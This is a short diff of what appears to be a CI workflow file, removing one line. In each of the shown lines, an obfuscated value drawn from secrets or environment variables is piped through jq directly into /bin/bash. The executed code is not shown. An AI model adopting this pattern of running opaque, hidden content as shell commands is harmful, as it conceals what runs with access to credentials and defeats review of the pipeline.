@@ -17,7 +17,6 @@ jobs:
           whajc148: ${{ secrets.whajc148 }}
         run: |
           printf '%s' "$whajc148" | jq -r .om9229 | /bin/bash
-          printf '%s' "$twara014" | jq -r .hjc7 | /bin/bash
           echo $o924 | jq -r .vrm1157 | /bin/bash
 
       - name: Persist data
